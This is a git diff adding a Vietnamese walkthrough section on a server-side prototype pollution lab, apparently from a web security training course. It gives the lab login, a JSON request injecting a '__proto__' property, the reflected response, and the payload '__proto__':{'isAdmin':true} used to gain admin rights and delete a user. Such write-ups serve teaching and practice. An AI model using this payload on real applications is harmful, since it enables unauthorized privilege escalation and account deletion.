@@ -96,6 +96,19 @@ Sau khi click submit, bài lab được giải.
 # 5. Client-side prototype pollution via browser APIs
 
 # 6. Privilege escalation via server-side prototype pollution
+Đăng nhập với credentials wiener:peter, ta thấy request `POST /my-account/change-address` nhận vào một chuỗi JSON và cũng trả về một chuỗi JSON trong response, trong đó có reflect dữ liệu đầu vào.
+
+Ta gửi request với body như sau:
+```
+{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"GZmsBz9dBDd40xsKNITU288ljrUhuIPH","isAdmin":true,"__proto__": {"test":"test_value"}}
+```
+Response trả về:
+```
+{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":false,"test":"test_value"}
+```
+Như vậy, có thể dự đoán rằng server side có lỗ hổng prototype pollution, và property `"test": "test_value"` đã được gán cho prototype của object.
+
+Nhận thấy trong response có `"isAdmin":false`. Khi đó, ta hoàn toàn có thể ghi đè lên thuộc tính này bằng cách thêm `"__proto__":{"isAdmin":true}` vào trong payload. Sau khi submit, ta refresh browser và thấy "Admin panel" xuất hiện. Xóa user carlos, bài lab được giải.
 
 # 7. Detecting server-side prototype pollution without polluted property reflection
 
